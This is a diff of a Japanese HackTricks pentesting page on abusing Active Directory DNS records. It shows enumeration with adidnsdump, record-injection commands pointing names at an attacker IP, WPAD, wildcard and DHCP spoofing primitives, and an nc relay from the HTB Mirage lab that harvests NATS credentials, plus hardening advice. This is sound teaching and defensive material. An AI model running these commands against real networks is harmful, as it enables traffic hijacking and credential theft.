@@ -1,10 +1,10 @@
-# AD DNSレコード
+# AD DNS レコード
 
 {{#include ../../banners/hacktricks-training.md}}
 
-デフォルトでは、Active Directory の**すべてのユーザー**が、ドメインまたはフォレストの DNS ゾーン内の**すべての DNS レコードを列挙**できます。これはゾーン転送に似ており、AD 環境の DNS ゾーンの子オブジェクトを一覧表示できます。
+デフォルトでは、Active Directory の**すべてのユーザー**が、Domain または Forest の DNS zone 内にある**すべての DNS レコードを enumerate**できます。これは zone transfer と似ており、AD 環境では DNS zone の子オブジェクトを一覧表示できます。
 
-[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) ツールを使うと、内部ネットワークの偵察を目的として、ゾーン内の**すべての DNS レコードを列挙**して**エクスポート**できます。<sup>[[4]](#references)</sup>
+[**adidnsdump**](https://github.com/dirkjanm/adidnsdump) を使うと、内部ネットワークの recon を目的として、zone 内の**すべての DNS レコードを enumerate**して**エクスポート**できます。<sup>[[4]](#references)</sup>
 
 ```bash
 git clone https://github.com/dirkjanm/adidnsdump
@@ -23,17 +23,17 @@ adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.loca
 cat records.csv
 ```
 
->  adidnsdump v1.4.0（2025年4月）では、JSON/Greppable（`--json`）出力、マルチスレッドDNS解決、LDAPSへのバインド時のTLS 1.2/1.3対応が追加されています  
+>  adidnsdump v1.4.0（2025年4月）では、JSON/Greppable（`--json`）出力、マルチスレッドDNS解決、LDAPSへのバインド時のTLS 1.2/1.3サポートが追加されています  
 
-詳細については、[https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup> をお読みください。
+詳しくは[https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>
 
 ---
 
 ## レコードの作成 / 変更（ADIDNS spoofing）
 
-**Authenticated Users** グループは、デフォルトでゾーンのDACLに対する **Create Child** 権限を持つため、任意のドメインアカウント（またはコンピューターアカウント）が追加のレコードを登録できます。これは、トラフィックのハイジャック、NTLM relay coercion、さらにはドメインの完全な侵害に利用できます。
+**Authenticated Users**グループには、デフォルトでゾーンのDACLに**Create Child**の権限があるため、任意のドメインアカウント（またはコンピューターアカウント）が追加のレコードを登録できます。これは、トラフィックのハイジャック、NTLM relay coercion、さらにはドメイン全体の侵害に利用できます。
 
-### PowerMad / Invoke-DNSUpdate（PowerShell）
+### PowerMad / Invoke-DNSUpdate (PowerShell)
 
 ```powershell
 Import-Module .\Powermad.ps1
@@ -52,7 +52,7 @@ Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
 python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
 ```
 
-*(dnsupdate.py は Impacket ≥0.12.0 に同梱)*
+*(dnsupdate.py は Impacket ≥0.12.0 に同梱されています)*
 
 ### BloodyAD
 
@@ -64,27 +64,27 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 
 ## 一般的な攻撃プリミティブ
 
-1. **ワイルドカードレコード** – `*.<zone>` により、AD DNS server が LLMNR/NBNS spoofing に似た、企業全体への応答機能を持つようになります。これを悪用して NTLM hashes を取得したり、LDAP/SMB に relay したりできます。（WINS-lookup が無効であることが必要です。）<sup>[[1]](#references)</sup>    
-2. **WPAD hijack** – `wpad` を追加する（または Global-Query-Block-List を回避するため、attacker host を指す **NS** record を追加する）ことで、送信 HTTP requests を透過的に proxy し、credentials を取得できます。Microsoft は wildcard/DNAME bypasses を patch しました（CVE-2018-8320）が、**NS-records は依然として機能します**。<sup>[[1]](#references)</sup>    
-3. **古いエントリの乗っ取り** – 以前 workstation に割り当てられていた IP address を取得すると、関連する DNS entry は引き続きその IP address に解決されます。これにより、DNS に一切触れずに resource-based constrained delegation や Shadow-Credentials attacks が可能になります。    
-4. **DHCP → DNS spoofing** – デフォルトの Windows DHCP+DNS deployment では、同じ subnet 上の認証されていない attacker が、dynamic DNS updates を発生させる偽造 DHCP requests を送信して、既存のあらゆる A record（Domain Controllers を含む）を上書きできます（Akamai「DDSpoof」、2023）。これにより Kerberos/LDAP に対する machine-in-the-middle が可能になり、最終的にはドメイン全体の乗っ取りにつながる可能性があります。<sup>[[2]](#references)</sup>    
-5. **Certifried (CVE-2022-26923)** – 自分が制御する machine account の `dNSHostName` を変更し、一致する A record を登録した後、その名前の certificate を要求して DC になりすまします。**Certipy** や **BloodyAD** などの tools を使えば、この一連の流れを完全に自動化できます。  
+1. **ワイルドカードレコード** – `*.<zone>` により、AD DNS サーバーを LLMNR/NBNS spoofing に似た、企業全体に応答するサーバーにできます。NTLM hash の取得や、LDAP/SMB への relay に悪用できます。（WINS lookup が無効になっている必要があります。）<sup>[[1]](#references)</sup>    
+2. **WPAD hijack** – `wpad` を追加するか、攻撃者のホストを指す **NS** レコードを追加して Global-Query-Block-List を回避し、アウトバウンド HTTP リクエストを透過的に proxy して認証情報を収集します。Microsoft は wildcard/DNAME による bypass を修正しました（CVE-2018-8320）が、**NS record は現在も機能します**。<sup>[[1]](#references)</sup>    
+3. **古いエントリの乗っ取り** – 以前ワークステーションが使用していた IP address を取得すると、関連する DNS entry は引き続き名前解決されます。DNS に一切触れずに、resource-based constrained delegation や Shadow-Credentials attacks を実行できます。    
+4. **DHCP → DNS spoofing** – Windows DHCP+DNS の既定の構成では、同じ subnet 上の未認証の攻撃者が、dynamic DNS updates を発生させる偽造 DHCP request を送信して、既存の A record（Domain Controller を含む）を上書きできます（Akamai「DDSpoof」、2023年）。これにより Kerberos/LDAP に対する machine-in-the-middle が可能になり、ドメイン全体の乗っ取りにつながる可能性があります。<sup>[[2]](#references)</sup>    
+5. **Certifried (CVE-2022-26923)** – 自分が制御する machine account の `dNSHostName` を変更し、一致する A record を登録してから、その名前の証明書を要求することで DC になりすまします。**Certipy** や **BloodyAD** などのツールで、この一連の手順を完全に自動化できます。  
 
-[serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) を含む AD DNS record は、conditional relay chain の一部となる可能性があります。そのためには、呼び出し元に record の作成権限があり、対象の computer がその名前に対して認証するよう仕向ける coercion path があり、さらにその認証を受け入れる relay destination が必要です。destination の protocol は個別に評価してください。受信接続で SMB signing が有効であっても、それだけでは HTTPS WinRM destination が relay を受け入れるかどうかは判断できません。結果は patch level、name handling、Extended Protection、service configuration によって変わる可能性があります。
+[serialized target information](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) を含む AD DNS record は、条件付き relay chain の一部となる可能性があります。これには、呼び出し元が record の作成権限を持つこと、対象コンピューターにその名前への認証を行わせる coercion path があること、そして認証結果を受け入れる relay 先があることが必要です。接続先の protocol は個別に評価してください。受信接続で SMB signing が有効であっても、それだけでは HTTPS WinRM の接続先が relay を受け入れるかどうかは判断できません。Patch level、名前の処理方法、Extended Protection、サービス構成によって結果が変わる場合があります。
 
 ---
 
-### 古い動的レコードを介した内部サービスの hijacking（NATS case study）
+### 古い動的レコードを介した内部サービスの乗っ取り（NATS の事例）
 
-dynamic updates がすべての認証済みユーザーに許可されている場合、**登録解除されたサービス名を再取得して、attacker のインフラを指すように設定できます**。Mirage HTB DC では DNS scavenging 後も hostname `nats-svc.mirage.htb` が残っていたため、低権限ユーザーであれば誰でも次の操作が可能でした。<sup>[[3]](#references)</sup>
+Dynamic update がすべての認証済みユーザーに許可されている場合、**登録解除されたサービス名を再取得し、攻撃者のインフラを指すように設定できます**。Mirage HTB の DC では、DNS scavenging 後もホスト名 `nats-svc.mirage.htb` が公開されていたため、低権限ユーザーなら誰でも次のことができました。<sup>[[3]](#references)</sup>
 
-1. `dig` を使って **record が存在しないことを確認**し、SOA を調べます。
+1. `dig` で**レコードが存在しないことを確認**し、SOA を調べます:
 
 ```bash
 dig @dc01.mirage.htb nats-svc.mirage.htb
 ```
 
-2. **レコードを再作成**して、自分が管理する外部/VPNインターフェースに向けます。
+2. **自分が制御する外部/VPNインターフェースを指すレコードを再作成する**:
 
 ```bash
 nsupdate
@@ -93,33 +93,36 @@ nsupdate
 > send
 ```
 
-3. **plaintext serviceをなりすます**。NATSクライアントは認証情報を送信する前に`INFO { ... }`バナーを1つ受信することを想定しているため、実際のbrokerから正規のバナーをコピーするだけで、秘密情報を収集できます。
+3. **plaintext serviceをなりすます**。NATSクライアントは認証情報を送信する前に`INFO { ... }`バナーを1つ受け取ることを想定しているため、実際のbrokerから正規のバナーをコピーするだけで秘密情報を収集できます。
 
 ```bash
 # Capture a single INFO line from the real service and replay it to victims
 nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
 ```
 
-Any client that resolves the hijacked name will immediately leak its JSON `CONNECT` frame (including `"user"`/`"pass"`) to the listener. Running the official `nats-server -V` binary on the attacker host, disabling its log redaction, or just sniffing the session with Wireshark yields the same plaintext credentials because TLS was optional.
+Hijacked された名前を解決するクライアントは、その JSON `CONNECT` フレーム（`"user"`/`"pass"`を含む）を直ちに listener に leak します。攻撃者ホストで公式の `nats-server -V` バイナリを実行する、ログの redaction を無効にする、または単に Wireshark でセッションを sniff するだけで、TLS が任意だったため、同じ平文の認証情報を取得できます。
 
-4. **取得した creds でピボット** – Mirage では、盗まれた NATS アカウントで JetStream にアクセスでき、そこから再利用可能な AD のユーザー名/パスワードを含む過去の認証イベントを確認できました。
+4. **取得した creds で Pivot** – Mirage では、盗んだ NATS アカウントから JetStream にアクセスでき、再利用可能な AD のユーザー名／パスワードを含む過去の認証イベントが明らかになりました。
 
-このパターンは、保護されていない TCP handshake に依存する AD 統合サービス（HTTP API、RPC、MQTT など）すべてに当てはまります。DNS レコードが hijack されると、攻撃者がサービスそのものになります。
+このパターンは、セキュリティ保護されていない TCP handshake に依存する AD 統合サービス（HTTP API、RPC、MQTT など）すべてに当てはまります。DNS レコードが hijack されると、攻撃者がサービスそのものになります。
+broker 側の列挙と retained-message の手順については、[NATS / JetStream pentesting](../../network-services-pentesting/4222-pentesting-nats.md) を参照してください。
 
 ---
 
-## 検出とハードニング
+## Detection & hardening
 
-* 機密性の高いゾーンでは、**Authenticated Users** に *Create all child objects* 権限を与えず、DHCP が使用する専用アカウントに動的更新を委任します。
-* 動的更新が必要な場合は、ゾーンを **Secure-only** に設定し、DHCP で **Name Protection** を有効にして、所有者であるコンピューターオブジェクトだけが自身のレコードを上書きできるようにします。
+* 機密性の高いゾーンでは、**Authenticated Users** から *Create all child objects* 権限を剥奪し、DHCP が使用する専用アカウントに動的更新を委任します。
+* 動的更新が必要な場合は、ゾーンを **Secure-only** に設定し、DHCP で **Name Protection** を有効にします。これにより、自身のレコードを上書きできるのは所有者のコンピューターオブジェクトだけになります。
 * DNS Server のイベント ID 257/252（動的更新）、770（ゾーン転送）、および `CN=MicrosoftDNS,DC=DomainDnsZones` への LDAP 書き込みを監視します。
-* 意図的に無害なレコード、または Global Query Block List を使用して、危険な名前（`wpad`、`isatap`、`*`）をブロックします。
-* DNS サーバーにパッチを適用します。たとえば、RCE の脆弱性である CVE-2024-26224 と CVE-2024-26231 は **CVSS 9.8** に達し、Domain Controller に対してリモートから悪用可能です。
+* 悪意のある名前（`wpad`、`isatap`、`*`）を、意図的に無害なレコードまたは Global Query Block List でブロックします。
+* DNS サーバーにパッチを適用します。たとえば、RCE の脆弱性 CVE-2024-26224 および CVE-2024-26231 は **CVSS 9.8** に達し、Domain Controller に対してリモートから悪用可能です。  
+
+
 
 ## References
 
-- [1] [ADIDNS 再考 - WPAD、GQBL など](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
-- [2] [DHCP DNS Dynamic Updates の悪用による DNS レコードの spoofing](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
-- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
-- [4] [ゾーンに侵入する: adidnsdump を使用した Active Directory DNS のダンプ](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+- [1] [ADIDNS 再訪 - WPAD、GQBL など](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
+- [2] [DHCP DNS 動的更新の悪用による DNS レコードの spoofing](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
+- [3] [HackTheBox Mirage: NFS の leak、Dynamic DNS の悪用、NATS 認証情報の窃取、JetStream の秘密情報、Kerberoasting の連鎖](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
+- [4] [ゾーンに侵入する: adidnsdump を使用した Active Directory DNS の dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
 {{#include ../../banners/hacktricks-training.md}}
